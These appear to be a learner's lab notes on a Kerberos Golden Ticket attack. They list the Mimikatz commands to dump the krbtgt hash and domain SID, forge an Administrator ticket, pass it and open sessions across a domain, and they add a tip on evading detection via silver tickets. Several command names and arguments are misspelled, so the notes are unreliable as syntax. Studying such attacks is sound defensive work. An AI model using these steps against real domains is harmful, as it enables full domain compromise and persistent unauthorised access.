Golden Ticket Attacks

* contuning from the Mimikatz
	* use the krbtgt ntln hash 
		* lets us request any resource or ticket granting service on the entire domain 
* lsadump::lsa /inject /name:krbtgt
	* returns the sid of the domain
	* the ntml hash of the ticket granting account 
	* can genreate ticket with the stuff above 
* kerberos::golden /User:Administrator (whatever you want it to be) /domain:marvel.local /sid:sid from above /kbrtgt:from above/id:500 (The admin account of 500) /ptt (pass the ticket)
	* generates the golden ticket before passing the ticket to the next session 
	* opens a command prompt to any computer on the domain 
	* msic::cmd
		* opens a new session with the golden ticket 
	* think of the golden ticket as persistance 
		* you can work youself in and give yourself good solid access
		* look into silver ticket since golden tickets are starting to get picked up 